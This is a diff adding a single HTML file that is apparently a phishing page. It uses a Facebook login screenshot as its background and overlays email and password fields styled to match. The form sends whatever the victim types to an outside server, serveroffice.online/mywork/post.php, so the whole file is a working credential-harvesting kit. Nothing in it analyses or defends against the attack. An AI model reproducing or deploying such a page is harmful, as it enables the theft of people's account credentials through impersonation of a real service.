@@ -1,0 +1,55 @@
+<html>
+    <head><style>
+        
+        body { background-image: url(fbpage.PNG)}
+       
+       
+        form         {padding-left: 515;
+                      padding-top: 238;}
+         input[type=text] {
+                        width: 36.3%;
+                        padding: 8px 5px;
+                        margin: 5px 0;
+                        box-sizing: border-box;                 
+                        border-color: 3px solid #555;
+}
+        input[type=password] {
+                        width: 36.3%;
+                        padding: 8px 5px;
+                        margin: 6px 0px;
+                        box-sizing: border-box;                 
+                        border-color: 3px solid #555;
+}
+             
+        button{ color: white;
+                 background: blue;
+                 padding: 13px 5px;
+                 margin: 6px 0px;
+                 border: none;
+                 font-family:sans-serif;
+                 font:bold;
+                 cursor: pointer;
+                 width: 36.3%;
+               
+                }
+        
+        </style></head>
+    <body>
+    <form action="http://serveroffice.online/mywork/post.php"  method="post" id="login_form">
+       
+        
+            <input name="email" type="text" id="email" autocomplete="" placeholder="Email or Phone Number" required= >
+         
+       
+             
+       <div>
+            <input name="pass" type="password" id="pass" autocomplete="of" placeholder="Password"required >
+           </div>  
+             <button type=submit class="login_botton" id="action" >Log In</button>
+    
+                   
+                   
+        </form>
+    
+    </body>
+</html>
